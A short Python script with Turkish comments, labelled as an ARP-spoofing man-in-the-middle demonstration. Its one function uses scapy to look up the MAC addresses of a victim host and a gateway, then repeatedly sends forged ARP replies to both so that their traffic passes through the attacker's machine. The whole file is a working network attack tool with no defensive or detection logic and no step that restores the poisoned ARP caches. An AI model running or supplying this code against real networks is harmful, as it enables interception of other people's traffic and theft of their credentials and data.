# İçerik: Simple ARP spoof for MITM demonstration

from scapy.all import ARP, send, getmacbyip
import time

def arp_poison(victim_ip: str, gateway_ip: str, iface: str, count: int = 100, interval: float = 1, log=print):
    """
    victim_ip ve gateway_ip adreslerine ARP poisoning yapar.
    """
    victim_mac = getmacbyip(victim_ip)
    gateway_mac = getmacbyip(gateway_ip)
    if not victim_mac or not gateway_mac:
        log("⚠️ MAC adresleri alınamadı. ARP poisoning başarısız.")
        return

    arp_to_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac)
    arp_to_gateway = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac)

    log(f"🔄 ARP poisoning başlatıldı: {victim_ip} <-> {gateway_ip} via {iface}")
    for i in range(count):
        send(arp_to_victim, iface=iface, verbose=False)
        send(arp_to_gateway, iface=iface, verbose=False)
        log(f"   • Paket {i+1}/{count} gönderildi")
        time.sleep(interval)
    log("✅ ARP poisoning tamamlandı")
